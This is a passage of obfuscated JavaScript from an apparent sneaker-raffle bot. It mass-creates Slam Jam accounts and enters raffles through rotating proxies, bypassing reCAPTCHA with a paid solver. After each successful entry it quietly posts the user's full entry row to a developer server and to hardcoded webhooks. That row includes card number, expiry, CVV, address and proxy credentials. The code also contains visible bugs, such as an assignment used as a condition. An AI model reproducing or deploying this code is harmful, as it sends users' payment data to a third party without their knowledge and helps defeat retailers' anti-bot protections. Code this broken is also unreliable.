                                const _0x2a29d7 = await _0x302fb3['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x212598 => {
                                    return _0x212598['map'](_0x52a2e4 => _0x52a2e4['textContent']);
                                });
                                var _0x2d386a = Math['round'](Math['random']() * (_0x2a29d7['length'] - 0x1));
                                console['log'](_0x3982db() + '\x20[' + _0x2132aa['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x2a29d7[_0x2d386a]), await _0x302fb3['click']('label[data-eu-size=\x22' + _0x2a29d7[_0x2d386a] + '\x22]');
                            } else {
                                console['log'](_0x3982db() + '\x20[' + _0x2132aa['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x302258[_0x16ddf4]['Size']);
                                try {
                                    await _0x302fb3['click']('label[data-eu-size=\x22' + _0x302258[_0x16ddf4]['Size'] + '\x22]');
                                } catch {
                                    await _0x302fb3['click']('label[data-eu-size=\x22' + _0x302258[_0x16ddf4]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x116d4a(0xbb8), await _0x302fb3['$$eval']('.raffle__checkbox-label', _0x174287 => _0x174287['forEach'](_0x30c418 => _0x30c418['click']())), await _0x116d4a(0x7d0), console['log'](_0x3982db() + '\x20[' + _0x2132aa['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x302fb3['click']('#raffle__form-submit'), await _0x116d4a(0x1388);
                            try {
                                await _0x302fb3['waitForSelector']('#raffle__confirmation-message-container'), _0x2d5d79 = 'no', _0x523ce4(_0x302258[_0x16ddf4], _0x2132aa), console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x2132aa['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0xf36506 = _0x302258[_0x16ddf4];
                                try {
                                    prxdata = {
                                        'username': _0x358285['replace']('#', ''),
                                        'module': _0x2132aa['name'],
                                        'entrydata': JSON['stringify'](_0xf36506),
                                        'proxy': '' + _0x37c6c1[_0x16ddf4]
                                    };
                                    var _0x43274d = JSON['stringify'](prxdata);
                                    let _0x2e6a2b = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x43274d, _0x2e6a2b);
                                } catch (_0x5f3f6) {
                                }
                            } catch (_0x4e330e) {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x4e330e));
                            }
                        } catch (_0x5ef8b8) {
                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20' + _0x5ef8b8)), _0x2d5d79 = 'yes';
                        } finally {
                            _0x21cda1 && _0x21cda1['close']();
                            if (_0x2d5d79 == 'yes' && _0x329451 != 0x5 && _0x4d7845 != 'Size\x20Not\x20Found') {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x2132aa['name'] + ']\x20Task\x20' + (_0x16ddf4 + 0x1) + '\x20:\x20Retrying\x20(' + _0x329451 + '\x20/\x205)')), _0x16ddf4 = _0x16ddf4 - 0x1, _0x329451 = _0x329451 + 0x1;
                                continue;
                            }
                            _0x2d5d79 == 'yes' && _0x329451 >= 0x5 && (_0x5925c7(_0x302258[_0x16ddf4], _0x2132aa), _0x2d5d79 = 'no', _0x329451 = 0x0), console['log']('Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x3b49d8, _0x5c7d50, _0x17cc46) {
                    _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x51d52a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2fdc55 = 0x0; _0x2fdc55 < _0x5c7d50['length']; _0x2fdc55++) {
                        if (_0x127215 != 'yes')
                            var _0x127215 = '', _0x23d7ac = 0x0;
                        var _0x1f116c = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x358285
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x51d52a['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3b2d4c
                                }
                            ]
                        }];
                        const _0x4c08bb = { 'embeds': _0x1f116c };
                        _0x244762(_0x3b49d8['name'] + '\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20/\x20' + _0x5c7d50['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
                        try {
                            await _0x2c2316(_0x5c7d50, _0x2fdc55);
                        } catch {
                            _0x127215 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x5420b9 = await _0x2520f4(_0x5c7d50[_0x2fdc55], _0x3b49d8, 'acc', ![]);
                        const _0x859c6a = { 'succesDEVMSG': { 'embeds': [_0x5420b9] } };
                        if (_0x5c7d50[_0x2fdc55]['Email'] == '' || _0x5c7d50[_0x2fdc55]['FirstName'] == '' || _0x5c7d50[_0x2fdc55]['LastName'] == '') {
                            console['log'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x116d4a(0x7d0);
                            continue;
                        }
                        (_0x5c7d50[_0x2fdc55]['Password'] == '' || _0x5c7d50[_0x2fdc55] == undefined) && _0x5c7d50[_0x2fdc55]['Password'] == 'JRaffles23!';
                        if (_0x51d52a['useRandomProxy'] = ![])
                            var _0x464537 = _0x17cc46[_0x2fdc55]['split'](':');
                        else
                            var _0x145a75 = Math['round'](Math['random']() * (_0x17cc46['length'] - 0x1)), _0x464537 = _0x17cc46[_0x145a75]['split'](':');
                        var _0x35e45e;
                        try {
                            _0x35e45e = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x464537[0x0] + ':' + _0x464537[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x35e45e = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x464537[0x0] + ':' + _0x464537[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x20fc3d = await _0x35e45e['newPage']();
                            await _0x20fc3d['authenticate']({
                                'username': '' + _0x464537[0x2],
                                'password': '' + _0x464537[0x3]
                            }), console['log'](_0x3982db() + '\x20[' + _0x3b49d8['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x20fc3d['setRequestInterception'](!![]), _0x20fc3d['on']('request', _0x2df491 => {
                                _0x2df491['resourceType']() === 'image' || _0x2df491['resourceType']() === 'font' || _0x2df491['resourceType']() === 'media' ? _0x2df491['abort']() : _0x2df491['continue']();
                            }), await _0x20fc3d['goto']('https://drop.slamjam.com/account/register'), await _0x116d4a(0xbb8), await _0x20fc3d['waitForSelector']('#FirstName'), await _0x20fc3d['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x20fc3d['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x3982db() + '\x20[' + _0x3b49d8['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20Filling\x20information'), await _0x116d4a(0x4b0), await _0x20fc3d['type']('#FirstName', '' + _0x5c7d50[_0x2fdc55]['FirstName']), await _0x116d4a(0x226), await _0x20fc3d['type']('#LastName', '' + _0x5c7d50[_0x2fdc55]['LastName']), await _0x116d4a(0x226), await _0x20fc3d['type']('#Email', '' + _0x5c7d50[_0x2fdc55]['Email']), await _0x116d4a(0x2ee), await _0x20fc3d['type']('#ConfirmEmail', '' + _0x5c7d50[_0x2fdc55]['Email']), await _0x116d4a(0x2ee), await _0x20fc3d['type']('#CreatePassword', '' + _0x5c7d50[_0x2fdc55]['Password']), await _0x116d4a(0x2ee), await _0x20fc3d['type']('#CreateConfirmPassword', '' + _0x5c7d50[_0x2fdc55]['Password']), await _0x116d4a(0x226), console['log'](_0x3982db() + '\x20[' + _0x3b49d8['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20Submitting..'), await _0x20fc3d['$eval']('#create_customer', _0x2c3623 => _0x2c3623['submit']()), await _0x116d4a(0x1388), console['log'](_0x3982db() + '\x20[' + _0x3b49d8['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20' + _0x1403a4['cyan']('Solving\x20Captcha')), await _0x20fc3d['solveRecaptchas'](), console['log'](_0x3982db() + '\x20[' + _0x3b49d8['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x20fc3d['$eval']('.shopify-challenge__container\x20>\x20form', _0x310769 => _0x310769['submit']());
                            try {
                                await _0x20fc3d['waitForSelector']('.product-card__image'), await _0x116d4a(0x1f4), _0x127215 = 'no', console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x3b49d8['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20Account\x20' + _0x5c7d50[_0x2fdc55]['Email'] + '\x20Generated!')), _0x65e0bc['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x5c7d50[_0x2fdc55]['Email'] + ',' + _0x5c7d50[_0x2fdc55]['Password']), console['log'](_0x1403a4['yellow'](_0x3982db() + '\x20[' + _0x3b49d8['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20Account\x20' + _0x5c7d50[_0x2fdc55]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x859c6a['succesDEVMSG']);
                                } catch {
                                }
                                await _0x3c7bbe(_0x431ce7, _0x859c6a['succesDEVMSG']);
                            } catch (_0x57fb94) {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x57fb94));
                            }
                        } catch (_0x22395c) {
                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20' + _0x22395c));
                        } finally {
                            _0x35e45e && _0x35e45e['close']();
                            if (_0x127215 == 'yes' && _0x23d7ac != 0x5) {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x3b49d8['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20Retrying\x20(' + _0x23d7ac + '\x20/\x205)')), _0x2fdc55 = _0x2fdc55 - 0x1, _0x23d7ac = _0x23d7ac + 0x1;
                                continue;
                            }
                            _0x127215 == 'yes' && _0x23d7ac >= 0x5 && (_0x5925c7(_0x5c7d50[_0x2fdc55], _0x3b49d8), _0x127215 = 'no', _0x23d7ac = 0x0), console['log']('Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x30a5a4, _0x552d07, _0xa8f6ca) {
                    _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x51d52a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1d9900 = 0x0; _0x1d9900 < _0x552d07['length']; _0x1d9900++) {
                        var _0x29f220;
                        if (_0x26f424 != 'yes')
                            var _0x26f424 = '', _0xe77d21 = 0x0;
                        _0x244762(_0x30a5a4['name'] + '\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20/\x20' + _0x552d07['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
                        try {
                            await _0x2c2316(_0x552d07, _0x1d9900);
                        } catch {
                            _0x26f424 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x552d07[_0x1d9900]['Email'] == '' || _0x552d07[_0x1d9900]['Password'] == '' || _0x552d07[_0x1d9900]['FirstName'] == '' || _0x552d07[_0x1d9900]['LastName'] == '') {
                            console['log'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x51d52a['useRandomProxy'] = ![])
                            var _0x1efb7c = _0xa8f6ca[_0x1d9900]['split'](':');
                        else
                            var _0x138761 = Math['round'](Math['random']() * (_0xa8f6ca['length'] - 0x1)), _0x1efb7c = _0xa8f6ca[_0x138761]['split'](':');
                        var _0x4c12ec;
                        try {
                            _0x4c12ec = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1efb7c[0x0] + ':' + _0x1efb7c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4c12ec = await _0x5d136d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1efb7c[0x0] + ':' + _0x1efb7c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2df670 = await _0x4c12ec['newPage']();
                            await _0x2df670['authenticate']({
                                'username': '' + _0x1efb7c[0x2],
                                'password': '' + _0x1efb7c[0x3]
                            }), await _0x2df670['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2df670['setRequestInterception'](!![]), _0x2df670['on']('request', _0x5addaa => {
                                _0x5addaa['resourceType']() === 'image' || _0x5addaa['resourceType']() === 'font' || _0x5addaa['resourceType']() === 'media' ? _0x5addaa['abort']() : _0x5addaa['continue']();
                            }), await _0x2df670['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x2df670['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x2df670['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x116d4a(0x258), await _0x2df670['waitForSelector']('#CustomerEmail'), console['log'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x2df670['type']('#CustomerEmail', '' + _0x552d07[_0x1d9900]['Email']), await _0x116d4a(0x12c), await _0x2df670['type']('#CustomerPassword', '' + _0x552d07[_0x1d9900]['Password']), await _0x116d4a(0x226), await _0x2df670['$eval']('#customer_login', _0x2c4167 => _0x2c4167['submit']()), await _0x116d4a(0x7d0), await _0x2df670['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20' + _0x1403a4['cyan']('Solving\x20Captcha')), await _0x2df670['solveRecaptchas'](), console['log'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x2df670['$eval']('.shopify-challenge__container\x20>\x20form', _0x386dbe => _0x386dbe['submit']());
                            try {
                                await _0x2df670['waitForSelector']('.nav-account'), await _0x116d4a(0x4b0);
                            } catch {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x2df670['goto']('' + _0x552d07[_0x1d9900]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x116d4a(0xbb8), console['log'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x2df670['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x2df670['click']('.product-select-variant-wrapper'), await _0x116d4a(0x320), await _0x2df670['click']('li.product-select-variant__value[data-size=\x22' + _0x552d07[_0x1d9900]['Size'] + '\x22]'), await _0x116d4a(0x384), await _0x2df670['$eval']('#AddToCartForm-product-template-raffle', _0x5f5256 => _0x5f5256['submit']()), await _0x2df670['waitForSelector']('.cart-order-summary__content'), await _0x116d4a(0x514), await _0x2df670['goto']('https://drop.slamjam.com/checkout'), await _0x116d4a(0x514), await _0x2df670['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x2df670['select']('#checkout_shipping_address_country', '' + _0x552d07[_0x1d9900]['Country']), await _0x116d4a(0x200), await _0x2df670['waitForSelector']('#checkout_shipping_address_first_name'), await _0x2df670['type']('#checkout_shipping_address_first_name', '' + _0x552d07[_0x1d9900]['FirstName']), await _0x116d4a(0x237), await _0x2df670['type']('#checkout_shipping_address_last_name', '' + _0x552d07[_0x1d9900]['LastName']), await _0x116d4a(0x1e0), await _0x2df670['type']('#checkout_shipping_address_address1', _0x552d07[_0x1d9900]['Address1'] + '\x20' + _0x552d07[_0x1d9900]['HouseNumber']), await _0x116d4a(0x514), await _0x2df670['type']('#checkout_shipping_address_address2', '' + _0x552d07[_0x1d9900]['Address2']), await _0x116d4a(0x514);
                            _0x552d07[_0x1d9900]['Postcode'] == undefined && (_0x552d07[_0x1d9900]['Postcode'] = _0x552d07[_0x1d9900]['Zip']);
                            await _0x2df670['type']('#checkout_shipping_address_zip', '' + _0x552d07[_0x1d9900]['Postcode']), await _0x116d4a(0x2bc), await _0x2df670['type']('#checkout_shipping_address_city', '' + _0x552d07[_0x1d9900]['City']), await _0x116d4a(0x320), await _0x2df670['type']('#checkout_shipping_address_phone', '' + _0x552d07[_0x1d9900]['Phone']), await _0x116d4a(0x320), await _0x2df670['click']('#continue_button'), await _0x116d4a(0xbb8), await _0x2df670['waitForSelector']('.summary-title'), await _0x116d4a(0x320), await _0x2df670['click']('#continue_button'), await _0x116d4a(0x320), console['log'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x2df670['waitForSelector']('#checkout_credit_card_vault'), await _0x116d4a(0x3e8);
                            var _0x2526d0 = await _0x2df670['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x29467c = await _0x2526d0['contentFrame']();
                            await _0x29467c['click']('#number'), await _0x116d4a(0x3e8), await _0x29467c['type']('#number', '' + _0x552d07[_0x1d9900]['CardNumber'], { 'delay': 0x78 }), _0x2526d0 = await _0x2df670['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x29467c = await _0x2526d0['contentFrame'](), await _0x116d4a(0x1c2), await _0x29467c['click']('#name'), await _0x116d4a(0x1f4), await _0x29467c['type']('#name', '' + _0x552d07[_0x1d9900]['NameOnCard'], { 'delay': 0x78 }), _0x2526d0 = await _0x2df670['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x29467c = await _0x2526d0['contentFrame'](), await _0x116d4a(0x1c2), await _0x29467c['click']('#expiry'), await _0x116d4a(0x1f4), await _0x29467c['type']('#expiry', '' + _0x552d07[_0x1d9900]['ExpiryDate'], { 'delay': 0x78 }), _0x2526d0 = await _0x2df670['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x29467c = await _0x2526d0['contentFrame'](), await _0x116d4a(0x1c2), await _0x29467c['click']('#verification_value'), await _0x116d4a(0x1f4), await _0x29467c['type']('#verification_value', '' + _0x552d07[_0x1d9900]['CVV'], { 'delay': 0x78 }), await _0x2df670['$eval']('#accepts-flag-raffle', _0x3214b9 => _0x3214b9['click']()), await _0x116d4a(0x7d0), console['log'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x2df670['$eval']('#continue_button', _0xd27aac => _0xd27aac['click']()), await _0x116d4a(0x1b58), await _0x2df670['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x2df670['$eval']('.edit_checkout.animate-floating-labels', _0xca5481 => _0xca5481['submit']()), await _0x116d4a(0x7d0);
                            try {
                                await _0x2df670['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x26f424 = 'no', _0x523ce4(_0x552d07[_0x1d9900], _0x30a5a4), console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x3114c6) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x3114c6['message']);
                            }
                            var _0x5bd98b = await _0x2520f4(_0x552d07[_0x1d9900], _0x30a5a4, 'dev', ![]), _0x40690b = await _0x2520f4(_0x552d07[_0x1d9900], _0x30a5a4, 'pub', ![]);
                            let _0x1b74dd = _0x552d07[_0x1d9900];
                            try {
                                prxdata = {
                                    'username': _0x358285['replace']('#', ''),
                                    'module': _0x30a5a4['name'],
                                    'entrydata': JSON['stringify'](_0x1b74dd),
                                    'proxy': '' + _0xa8f6ca[_0x1d9900]
                                };
                                var _0x428f59 = JSON['stringify'](prxdata);
                                let _0x447092 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x428f59, _0x447092);
                            } catch (_0x325255) {
                            }
                            const _0x13973d = {
                                'succesDEVMSG': { 'embeds': [_0x5bd98b] },
                                'succesPUBMSG': { 'embeds': [_0x40690b] }
                            };
                            try {
                                _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x13973d['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x13973d['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x55a106, _0x13973d['succesPUBMSG']);
                            } catch (_0x13927c) {
                                console['log'](_0x1403a4['yellow'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x13927c));
                            }
                        } catch (_0x5a1978) {
                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20' + _0x5a1978)), _0x29f220 = '' + _0x5a1978;
                            var _0x55d444 = await _0x2520f4(kickz[_0x1d9900], _0x30a5a4, 'dev', !![], _0x29f220);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x55d444] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], EMBEDS['errorDEV']), await _0x3c7bbe(_0x802c1e, EMBEDS['errorDEV']), _0x26f424 = 'yes';
                        } finally {
                            _0x4c12ec && _0x4c12ec['close']();
                            if (_0x26f424 == 'yes' && _0xe77d21 != 0x5 && _0x29f220 != 'Size\x20Not\x20Found') {
                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Retrying\x20(' + _0xe77d21 + '\x20/\x205)')), _0x1d9900 = _0x1d9900 - 0x1, _0xe77d21 = _0xe77d21 + 0x1;
                                continue;
                            }
                            _0x26f424 == 'yes' && _0xe77d21 >= 0x5 && (_0x5925c7(_0x552d07[_0x1d9900], _0x30a5a4), _0x26f424 = 'no', _0xe77d21 = 0x0), console['log']('Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x46c77c) {
                    var _0x3a4f44 = await _0x1083d0(), _0x39c65d = _0x65e0bc['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x58f55c = _0x3e0e2d['parse'](_0x39c65d, { 'header': !![] })['data'];
                    for (var _0xba2d09 = 0x0; _0xba2d09 < _0x58f55c['length']; _0xba2d09++) {
                        var _0x2335cc = _0x58f55c[_0xba2d09]['Store'], _0x59321f = _0x58f55c[_0xba2d09]['Mode'];
                        for (var _0x549214 of _0x1a1b7d) {
                            const _0x16e494 = _0x549214['name']['includes'](_0x2335cc);
                            if (!_0x16e494)
                                continue;
                            for (mode of _0x549214['modules']) {
                                if (mode['name'] == _0x59321f) {
                                    console['log']('Running\x20' + _0x1403a4['cyan'](mode['name'])), await mode['function'](mode, [_0x58f55c[_0xba2d09]], _0x3a4f44);
                                    var _0x4797eb = _0x39c65d['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x65e0bc['writeFileSync']('../failed-tasks.csv', _0x4797eb);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x372071 = await _0xab4dc6['get']('Answer');
                    if (_0x372071['Answer']['toLowerCase']() == 'y') {
                        _0x65e0bc['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x116d4a(0x3e8);
                        return;
                    }
                    if (_0x372071['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x116d4a(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x116d4a(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x4cdf9c(_0x381a57) {
    var _0x174f3e = await _0x1083d0(), _0x3a1eea = _0x65e0bc['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x316e56 = _0x3e0e2d['parse'](_0x3a1eea, { 'header': !![] })['data'];
    for (var _0x2a8e57 = 0x0; _0x2a8e57 < _0x316e56['length']; _0x2a8e57++) {
        var _0x1a4553 = _0x316e56[_0x2a8e57]['Store'], _0x5a11e5 = _0x316e56[_0x2a8e57]['Mode'];
        for (var _0x52d5a5 of _0x1a1b7d) {
            const _0x5d93b9 = _0x52d5a5['name']['includes'](_0x1a4553);
            if (_0x5d93b9)
                for (mode of _0x1a1b7d[_0x52d5a5]['modules']) {
                    const _0xa4725f = mode['name']['includes'](_0x5a11e5);
                    _0xa4725f && (_0x381a57 = mode['name'], await mode['function'](_0x381a57, _0x316e56[_0x2a8e57], _0x174f3e));
                }
        }
    }
}
async function _0x4556c9() {
    await _0x2b1268(), console['clear']();
    _0x51d52a['threads'] > 0x5 && (_0x51d52a['threads'] = 0x5);
    if (_0x3b2d4c != 'devkey') {
        let _0x3fbcbd = await _0x141a06['autoUpdate']();
        if (_0x3fbcbd === 'yes')
            return _0x5ddab8('node\x20JRaffles.js');
        console['clear']();
    }
